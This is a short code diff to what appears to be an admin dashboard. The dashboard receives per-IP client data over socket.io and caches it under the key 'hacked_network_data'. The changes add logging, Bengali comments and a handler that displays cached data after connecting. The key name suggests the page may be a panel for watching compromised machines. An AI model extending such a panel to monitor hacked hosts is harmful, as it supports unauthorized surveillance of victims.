@@ -50,8 +50,11 @@
 </div>
 <div id="clientsGrid" class="client-grid"></div>
 <script>
+    // এডমিন হিসেবে কানেক্ট
     const socket = io({ query: { admin: 'true' } });
     const CACHE_KEY = 'hacked_network_data';
+
+    console.log('Admin page loaded, socket connecting...');
 
     function loadCache() {
         try { return JSON.parse(localStorage.getItem(CACHE_KEY) || '{}'); } catch { return {}; }
@@ -61,6 +64,7 @@
     }
 
     function render(clientsData) {
+        console.log('Rendering clients:', clientsData);
         const grid = document.getElementById('clientsGrid');
         grid.innerHTML = '';
         const keys = Object.keys(clientsData);
@@ -119,6 +123,7 @@
     }
 
     socket.on('admin_update', (liveData) => {
+        console.log('Received admin_update:', liveData);
         const cache = loadCache();
         for (const [ip, data] of Object.entries(liveData)) {
             cache[ip] = data;
@@ -131,6 +136,19 @@
         }
         saveCache(cache);
         render(cache);
+    });
+
+    // কানেক্ট হওয়ার পর যদি কোনো ডেটা না আসে, তবুও ক্যাশে দেখাও
+    socket.on('connect', () => {
+        console.log('Admin socket connected');
+        // কিছুক্ষণ পর ক্যাশে দেখাতে পারি
+        setTimeout(() => {
+            const cached = loadCache();
+            if (Object.keys(cached).length > 0) {
+                console.log('Displaying cached data');
+                render(cached);
+            }
+        }, 2000);
     });
 
     window.addEventListener('load', () => {
